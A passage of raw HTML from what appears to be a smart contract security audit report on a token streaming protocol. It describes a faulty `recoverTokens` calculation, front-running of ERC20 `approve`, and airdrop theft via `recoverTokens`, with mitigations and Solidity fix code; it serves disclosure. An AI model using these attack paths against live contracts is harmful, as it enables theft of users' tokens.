0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>In <code>recoverTokens</code>, the logic to calculate the excess number of deposit tokens in the contract is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);</span></span></code></pre>\n<p>This breaks in the case where isSale is true and the deposit tokens have already been claimed through the use of <code>creatorClaimSoldTokens</code>. In this case, <code>redemeedDepositTokens</code> will be zero, and <code>depositTokenAmount</code> will still be at its original value when the streaming ended. As a result, any attempts to recover deposit tokens from the contract would either revert or send less tokens than should be sent, since the logic above would still think that there are the full amount of deposit tokens in the contract. This breaks the functionality of the function completely in this case.</p>\n<h4 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>See the excess calculation here: <a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654</a></p>\n<p>See <code>creatorClaimSoldTokens</code> here: <a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L583\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L583</a></p>\n<p>Notice that <code>creatorClaimSoldTokens</code> does not change <code>depositTokenAmount</code> or <code>redeemedDepositTokens</code>, so the excess calculation will be incorrect in the case of sales.</p>\n<h4 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>Inspection</p>\n<h4 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>I would recommend setting <code>redeemedDepositTokens</code> to be <code>depositTokenAmount</code> in the function <code>creatorClaimSoldTokens</code>, since claiming the sold tokens is like “redeeming” them in a sense. This would fix the logic issue in <code>recoverTokens</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-989284471\">brockelmore (Streaming Protocol) commented</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-1013574494\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>upgrading to High as assets would be lost in the case outlined by the warden</p>\n<p><code>3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).</code></p>\n</blockquote>\n<h1 id=\"medium-risk-findings-5\" style=\"position:relative;\"><a href=\"#medium-risk-findings-5\" aria-label=\"medium risk findings 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (5)</h1>\n<h2 id=\"m-01-lockeerc20-is-vulnerable-to-frontrun-attack\" style=\"position:relative;\"><a href=\"#m-01-lockeerc20-is-vulnerable-to-frontrun-attack\" aria-label=\"m 01 lockeerc20 is vulnerable to frontrun attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/55\">[M-01] LockeERC20 is vulnerable to frontrun attack</a></h2>\n<p><em>Submitted by egjlmn1, also found by itsmeSTYJ, toastedsteaksandwich, and WatchPug</em></p>\n<h4 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>A user can steal another user’s tokens if he frontrun before he changes the allowance.</p>\n<p>The <code>approve()</code> function receives an amount to change to.\nLets say user A approved user B to take N tokens, and now he wants to change from N to M, if he calls <code>approve(M)</code> the attacker can frontrun, take the N tokens, wait until after the approve transaction, and take another M tokens. And taking N tokens more than the user wanted.</p>\n<h4 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>Manual code review</p>\n<h4 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Change the approve function to either accept the old amount of allowance and require the current allowance to be equal to that, or change to two different functions that increase and decrease the allowance instead of straight on changing it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/55\">brockelmore (Streaming Protocol) acknowledged and disagreed with severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/55#issuecomment-1013524455\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Front running of the <code>approve</code> ERC20 function is pretty well documented and this point and there are some good ways to mitigate this risk.  I am going to downgrade to Medium since there are some other requirements for this to actual mean that assets have been lost\n<code>2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n</blockquote>\n<h2 id=\"m-02-any-arbitrarycall-gathered-airdrop-can-be-stolen-with-recovertokens\" style=\"position:relative;\"><a href=\"#m-02-any-arbitrarycall-gathered-airdrop-can-be-stolen-with-recovertokens\" aria-label=\"m 02 any arbitrarycall gathered airdrop can be stolen with recovertokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/162\">[M-02] Any arbitraryCall gathered airdrop can be stolen with recoverTokens</a></h2>\n<p><em>Submitted by hyh</em></p>\n<h4 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>Any airdrop gathered with <code>arbitraryCall</code> will be immediately lost as an attacker can track <code>arbitraryCall</code> transactions and back run them with calls to <code>recoverTokens</code>, which doesn’t track any tokens besides reward, deposit and incentive tokens, and will give the airdrop away.</p>\n<h4 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p><code>arbitraryCall</code> requires that tokens to be gathered shouldn’t be reward, deposit or incentive tokens:\n<a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735</a></p>\n<p>Also, the function doesn’t mark gathered tokens in any way. Thus, the airdrop is freely accessible for anyone to be withdrawn with <code>recoverTokens</code>:\n<a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L687\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L687</a></p>\n<h4 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Add airdrop tokens balance mapping, record what is gathered in <code>arbitraryCall</code> and prohibit their free withdrawal in <code>recoverTokens</code> similarly to incentives[].</p>\n<p>Now:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recoverTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span></code></pre>\n<p>To be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">airdrops</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recoverTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">airdrops</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">airdrops</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// we do know what airdrop token will be gathered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">arbitraryCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> </span><span class=\"mtk11\">externallyGoverned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get token balances</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositTokenBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preRewardTokenBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preAirdropBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ret</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">who</span><span class=\"mtk1\">.</span><span class=\"mtk11\">call</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">postAirdropBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">postAirdropBalance</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;air_112&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint112</span><span class=\"mtk1\">(</span><span class=\"mtk12\">postAirdropBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">preAirdropBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;air&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">airdrops</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amt</span><span 